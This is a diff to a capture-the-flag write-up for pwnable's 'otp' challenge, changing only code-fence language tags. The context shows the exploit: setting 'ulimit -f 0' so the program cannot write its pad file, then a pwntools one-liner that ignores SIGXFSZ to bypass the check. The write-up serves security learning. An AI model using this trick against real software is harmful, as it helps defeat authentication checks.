@@ -7,7 +7,7 @@ This is generally undesirable
 but perfect for us.
 
 To see what I mean, let's inspect `otp.c`:
-```C
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -72,7 +72,7 @@ we can limit the number of bytes written to (but not read from!) a file using th
 i.e. calling `unlimit -f 0` from the command line will prohibit any writes in any child processes the shell spawns.
 
 Let's try it:
-```bash
+```
 otp@pwnable:~$ ulimit -f 0
 otp@pwnable:~$ gdb otp
 (gdb) r 0
@@ -91,7 +91,7 @@ This can be done easily in python using the [signal](https://docs.python.org/2.7
 
 Putting it all together we arrive at the final exploit:
 
-```bash
+```
 otp@pwnable:~$ python -c "from pwn import *; import signal; signal.signal(signal.SIGXFSZ, signal.SIG_IGN); print process(['./otp', '0']).recvall()"
 [+] Starting local process './otp': pid 433582
 [+] Receiving all data: Done (90B)
